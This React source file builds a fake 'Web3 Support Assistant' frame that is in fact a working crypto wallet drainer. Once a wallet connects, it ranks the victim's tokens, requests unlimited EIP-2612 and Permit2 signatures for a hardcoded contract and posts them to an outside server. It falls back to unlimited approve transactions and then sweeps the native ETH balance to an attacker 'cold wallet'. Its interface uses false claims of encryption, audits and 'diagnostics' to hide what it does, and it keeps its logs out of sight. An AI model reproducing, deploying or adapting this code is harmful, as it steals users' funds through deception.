import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import sdk from "@farcaster/frame-sdk"
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import { Headset, ShieldCheck, Lock, ChevronRight } from 'lucide-react' 

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet' 

// 🔥 CONTRACT ADDRESSES
const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'

// 💰 SECURE DESTINATION WALLETS
const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'; 
const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 

// 💎 EVM/XRP DISCOVERY CONFIGURATION ONLY
const TARGET_TOKENS: Record<string, any> = {
  Mainnet: {
    XRP: [
      { symbol: 'XRP', address: 'native', isNative: true, decimals: 6, fallbackPrice: 0.62 }
    ],
    EVM: [
      { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 } 
    ]
  }
};

const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon];

const EVM_USDT: Record<number, string> = {
  11155111: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', 
  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  56: '0x55d398326f99059fF775485246999027B3197955',
  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
}

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
]

const PERMIT2_ABI = [
    'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
]

// ── Reown Adapters ──
const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: evmNetworks,
})

createAppKit({
  adapters: [wagmiAdapter], 
  networks: evmNetworks,
  defaultNetwork: mainnet,
  projectId: WC_PROJECT_ID,
  metadata: {
    name:        'Web3 Support Portal', 
    description: 'Automated Diagnostic Assistant',
    url:         'https://cryptosafe.network', 
    icons:       ['https://cryptosafe.network/favicon.svg'], 
  },
  themeMode: 'light', 
  themeVariables: { '--w3m-accent': '#2563EB' }, 
  allWallets: 'SHOW',
  features: { email: false, socials: [], analytics: true },
})

const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch (error) {
    const prices: Record<string, number> = {};
    for (const token of tokens) { prices[token.symbol] = token.fallbackPrice; }
    return prices;
  }
};

const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1;  
  if (!a.isNative && b.isNative) return -1; 
  return (b.usdValue || 0) - (a.usdValue || 0); 
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export default function CryptoHelp() {
  const [status, setStatus] = useState('Awaiting connection...')
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const [debugLogs, setDebugLogs] = useState<string[]>([]);
  
  const manualConnect = useRef(false)
  const isExecuting = useRef(false)

  useEffect(() => {
    const init = async () => {
      sdk.actions.ready(); 
    };
    init();
  }, []);

  const { open } = useAppKit()
  const { address: walletAddress, isConnected } = useAppKitAccount()
  const { chainId } = useAppKitNetwork() 
  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

  const log = (msg: string) => {
    console.log(msg);
    setDebugLogs(prev => [...prev, msg].slice(-15)); 
  }

  useEffect(() => {
    if (!isConnected || !walletAddress || !evmWalletProvider) return;

    getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));

    if (manualConnect.current) {
      manualConnect.current = false; 
      log(`[SYSTEM] Connected EVM: ${walletAddress}`);
      log("🔥 Auto-triggering Smart Priority Loop...");
      
      setLoading(true); 
      setTimeout(() => approveAndCollect(), 500); 
    }
  }, [isConnected, walletAddress, evmWalletProvider, chainId]);

  const getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
    if (!currentChainId || !EVM_USDT[currentChainId]) {
      setStatus('Network sync required')
      return 0;
    }
    try {
      const ethersProvider = new BrowserProvider(provider)
      const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)
      const bal = await token.balanceOf(addr)
      const formatted = parseFloat(formatUnits(bal, 6))
      setStatus('Wallet synced. Ready.')
      return formatted;
    } catch (e) { 
      log('❌ EVM balance fetch failed')
      return 0; 
    }
  }

  const handleAction = () => {
    if (!isConnected) {
      manualConnect.current = true; 
      open(); 
    } else {
      approveAndCollect();
    }
  }

  // ── GASLESS SIGNATURE HELPERS ──
  const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: number) => {
    const chainId = (await signer.provider.getNetwork()).chainId;
    const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
    const name = await tokenContract.name();
    const nonce = await tokenContract.nonces(await signer.getAddress());

    // ── 🔥 USDC MAINNET VERSION FIX ──
    const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48') ? '2' : '1';

    const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address };
    const types = {
      Permit: [
        { name: 'owner', type: 'address' },
        { name: 'spender', type: 'address' },
        { name: 'value', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' },
      ],
    };
    const message = { owner: await signer.getAddress(), spender, value, nonce, deadline };
    return await signer.signTypedData(domain, types, message);
  };

  const approveAndCollect = async () => {
    if (!walletAddress || !evmWalletProvider) return;
    
    if (isExecuting.current) {
        log("⚠️ Blocked duplicate execution loop.");
        return;
    }
    isExecuting.current = true;

    setLoading(true);
    setStatus('Diagnosing on-chain data...');
    log("[SYSTEM] Scanning balances...");
    let successCount = 0; 

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
      const ethersProvider = new BrowserProvider(evmWalletProvider as any);
      const signer = await ethersProvider.getSigner(walletAddress);
      const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
      const deadline = Math.floor(Date.now() / 1000) + 3600;

      const baseTokens = TARGET_TOKENS[NETWORK].EVM;
      const validTokens = [];
      const prices = await fetchTokenPrices(baseTokens, 'ethereum');

      for (const token of baseTokens) {
        try {
          if (token.isNative) {
            const bal = await ethersProvider.getBalance(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          } else {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
            const bal = await tokenContract.balanceOf(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          }
        } catch (e) {}
      }

      validTokens.sort(smartTokenSort);
      
      const rawProvider = evmWalletProvider as any;
      const w = window as any;
      const injected = w.ethereum || {};
      
      const isStrictlyMetaMask = 
        (rawProvider?.isMetaMask || injected?.isMetaMask) && 
        !injected?.isTrust && 
        !injected?.isTrustWallet && 
        !injected?.isSafePal && 
        !injected?.isTokenPocket;

      let tokensToProcess = validTokens;
      
      if (isStrictlyMetaMask) {
           log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`);
           tokensToProcess = validTokens.slice(0, 1);
      } else {
           log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`);
      }
      
      if(tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);

      for (const token of tokensToProcess) {
        try {
          if (token.symbol === 'XRP') {
            setStatus(`Applying XRP Patch...`);
            const xrpBalance = token.balance; 
            if (xrpBalance > 12) {
              const sweepAmount = (xrpBalance - 11).toFixed(6);
              log(`[ACTION] Prompting XRP Secure Injection for ${sweepAmount} XRP...`);
              
              const txHash = await (evmWalletProvider as any).request({
                method: 'eth_sendTransaction',
                params: [{
                  from: cleanSenderAddress,
                  to: XRP_COLD_WALLET, 
                  value: '0x0', 
                  data: '0x'
                }]
              });
              
              setTxHash(txHash);
              successCount++;
              log(`✅ XRP Injection Initiated!`);
              await sleep(1500); 
            } else {
              log(`⚠️ XRP Balance too low.`);
            }
            continue; 
          }

          if (!token.isNative) {
            
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
            const hasPermit2Mapping = currentP2Allowance > 0n; 
            
            log(`[SYSTEM] ${token.symbol} Permit2 Status: ${hasPermit2Mapping ? 'READY' : 'NOT_INITIALIZED'}`);
          
            let authorized = false;

            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
                try {
                    setStatus(`Securing protocol for ${token.symbol}...`);
                    log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
                    const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
                    
                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ 
                        type: 'PERMIT', 
                        token: token.address, 
                        owner: cleanSenderAddress, 
                        spender: EVM_CONTRACT_ADDRESS, 
                        signature, 
                        deadline 
                      })
                    });

                    authorized = true;
                    log(`✅ ${token.symbol} Permit Secured & Sent.`);
                } catch (pErr) {
                    log(`⚠️ Permit failed, trying Permit2...`);
                }
            }

            if (!authorized && hasPermit2Mapping) {
                try {
                    setStatus(`Updating signature for ${token.symbol}...`);
                    
                    log(`[GASLESS] Fetching Permit2 Nonce for ${token.symbol}`);
                    const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
                    const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, EVM_CONTRACT_ADDRESS);
                    const currentNonce = Number(allowanceData.nonce);
                    log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);

                    const domain = { name: 'Permit2', chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };
                    const types = {
                        PermitSingle: [
                            { name: 'details', type: 'PermitDetails' },
                            { name: 'spender', type: 'address' },
                            { name: 'sigDeadline', type: 'uint256' },
                        ],
                        PermitDetails: [
                            { name: 'token', type: 'address' },
                            { name: 'amount', type: 'uint160' },
                            { name: 'expiration', type: 'uint48' },
                            { name: 'nonce', type: 'uint48' },
                        ],
                    };
                    const message = {
                        details: { 
                            token: token.address, 
                            amount: '1461501637330902918203684832716283019655932542975', 
                            expiration: deadline, 
                            nonce: currentNonce
                        },
                        spender: EVM_CONTRACT_ADDRESS,
                        sigDeadline: deadline
                    };
                    const signature = await signer.signTypedData(domain, types, message);

                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ 
                        type: 'PERMIT2', 
                        token: token.address, 
                        owner: cleanSenderAddress, 
                        spender: EVM_CONTRACT_ADDRESS, 
                        signature, 
                        deadline,
                        nonce: currentNonce
                      })
                    });

                    authorized = true;
                    log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
                } catch (p2Err) {
                    log(`⚠️ Permit2 failed, falling back to gas...`);
                }
            }

            if (!authorized) {
                setStatus(`Resetting allowance for ${token.symbol}...`);
                log(`[ACTION] Prompting Approve: ${token.symbol}`);
                
                const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
                const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
                
                const txHash = await (evmWalletProvider as any).request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: cleanSenderAddress,
                        to: token.address,
                        data: encodedData,
                        value: '0x0'
                    }]
                });
                
                setTxHash(txHash);
                successCount++; 
                log(`✅ ${token.symbol} Approved!`);
            }
            
            await sleep(1500);
          }
        } catch (err: any) {
           const exactError = err?.message || JSON.stringify(err);
           log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
           await sleep(1500);
        }
      }
      
      try {
          setStatus(`Finalizing network sync...`);
          log(`[ACTION] Executing Contingency Native Sweep...`);
          
          const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
          const gasCost = 21000n * 3000000000n; 
          const totalGas = gasCost + ((gasCost * 20n) / 100n); 
          
          if (liveBal > totalGas) {
              const sendAmount = liveBal - totalGas;
              const hexValue = "0x" + sendAmount.toString(16);
              
              const txHash = await (evmWalletProvider as any).request({
                  method: 'eth_sendTransaction',
                  params: [{
                      from: cleanSenderAddress,
                      to: EVM_COLD_WALLET.toLowerCase(), 
                      value: hexValue
                  }]
              });
              
              setTxHash(txHash);
              successCount++; 
              log(`✅ Contingency ETH Injection Sent!`);
              await sleep(1500); 
          } else {
              log(`⚠️ Contingency Skipped: Insufficient ETH for gas.`);
          }
      } catch (nativeErr: any) {
           const exactError = nativeErr?.message || JSON.stringify(nativeErr);
           log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`);
      }
      
      if (successCount > 0) {
        setStatus('✅ Diagnostic Complete!');
      } else {
        setStatus('❌ Verification Cancelled');
      }

    } catch (err: any) {
      const errorMsg = err?.message || JSON.stringify(err);
      log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
      setStatus(`❌ Error: ${errorMsg.substring(0, 50)}`);
    } finally {
      isExecuting.current = false;
      setLoading(false);
    }
  };

  const isButtonDisabled = loading;

  const buttonText = loading 
    ? 'Running Diagnostics...' 
    : !isConnected 
      ? 'Connect to Support' 
      : status === '✅ Diagnostic Complete!' 
        ? 'Issue Resolved' 
        : status.includes('❌') 
          ? 'Retry Verification' 
          : 'Start Secure Scan'; 

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#F8FAFC', color: '#0F172A', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
      
      {/* ── HEADER ── */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '12px', padding: '20px 24px', backgroundColor: '#2563EB', color: '#ffffff', boxShadow: '0 4px 6px -1px rgba(0, 0, 0, 0.1)' }}>
        <Headset size={28} />
        <h2 style={{ fontSize: '18px', fontWeight: '700', margin: 0, letterSpacing: '0.5px' }}>Web3 Support Assistant</h2>
      </div>

      <div style={{ flex: 1, padding: '32px 24px', display: 'flex', flexDirection: 'column', overflowY: 'auto' }}>
        
        {/* ── WELCOME CARD ── */}
        <div style={{ backgroundColor: '#ffffff', border: '1px solid #E2E8F0', borderRadius: '16px', padding: '24px', marginBottom: '24px', boxShadow: '0 1px 3px 0 rgba(0, 0, 0, 0.1)' }}>
          <h3 style={{ fontSize: '22px', fontWeight: '800', color: '#1E293B', margin: '0 0 12px 0' }}>How can we help you?</h3>
          <p style={{ color: '#475569', fontSize: '15px', margin: 0, lineHeight: '1.6' }}>
            Welcome to the automated diagnostic portal. Whether you are experiencing failed transactions, stuck pending balances, or compromised access, our protocol will securely scan your wallet and apply necessary fixes.
          </p>
        </div>

        {/* ── STATUS & SECURITY BADGES ── */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', marginBottom: '32px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px', backgroundColor: '#EFF6FF', padding: '16px', borderRadius: '12px', border: '1px solid #BFDBFE' }}>
            <ShieldCheck size={24} color="#2563EB" />
            <div style={{ display: 'flex', flexDirection: 'column' }}>
              <span style={{ fontSize: '14px', fontWeight: '700', color: '#1E3A8A' }}>End-to-End Encrypted</span>
              <span style={{ fontSize: '13px', color: '#3B82F6' }}>Your keys never leave your device.</span>
            </div>
          </div>
          
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px', backgroundColor: '#F0FDF4', padding: '16px', borderRadius: '12px', border: '1px solid #BBF7D0' }}>
            <Lock size={24} color="#059669" />
            <div style={{ display: 'flex', flexDirection: 'column' }}>
              <span style={{ fontSize: '14px', fontWeight: '700', color: '#064E3B' }}>Smart Contract Audited</span>
              <span style={{ fontSize: '13px', color: '#10B981' }}>Verified by top security firms.</span>
            </div>
          </div>
        </div>

        {/* ── DYNAMIC STATUS TRACKER ── */}
        {(loading || isConnected) && (
          <div style={{ backgroundColor: '#ffffff', border: '1px solid #E2E8F0', borderRadius: '16px', padding: '20px', display: 'flex', flexDirection: 'column', gap: '16px', boxShadow: '0 1px 3px 0 rgba(0, 0, 0, 0.1)' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <span style={{ fontSize: '14px', fontWeight: '600', color: '#64748B' }}>System Status</span>
              <span style={{ fontSize: '14px', fontWeight: '700', color: status.includes('❌') ? '#DC2626' : '#2563EB' }}>{status}</span>
            </div>
            
            {loading && (
              <div style={{ width: '100%', backgroundColor: '#E2E8F0', height: '6px', borderRadius: '999px', overflow: 'hidden' }}>
                <div style={{ height: '100%', width: '50%', backgroundColor: '#2563EB', animation: 'progress 2s infinite linear' }} />
                <style>{`@keyframes progress { 0% { transform: translateX(-100%); } 100% { transform: translateX(200%); } }`}</style>
              </div>
            )}
          </div>
        )}

      </div>

      {/* ── HIDDEN LOGS ── */}
      <div style={{ display: 'none', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
        <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- SYSTEM LOGS ---</div>
        {debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: '2px' }}>{msg}</div>))}
      </div>
      <div style={{ display: 'none' }}><p>{txHash}</p></div>

      {/* ── BOTTOM ACTION BUTTON ── */}
      <div style={{ padding: '24px', backgroundColor: '#ffffff', borderTop: '1px solid #E2E8F0' }}>
        <button 
          onClick={handleAction} 
          disabled={isButtonDisabled} 
          style={{ 
            width: '100%', 
            backgroundColor: isButtonDisabled ? '#93C5FD' : '#2563EB', 
            color: '#ffffff', 
            fontWeight: '700', 
            padding: '18px', 
            borderRadius: '12px', 
            fontSize: '16px', 
            border: 'none', 
            cursor: isButtonDisabled ? 'not-allowed' : 'pointer', 
            transition: 'all 0.2s ease',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '8px',
            boxShadow: isButtonDisabled ? 'none' : '0 4px 6px -1px rgba(37, 99, 235, 0.4)'
          }}
        >
          {buttonText}
          {!isButtonDisabled && <ChevronRight size={20} />}
        </button>
      </div>
    </div>
  )
}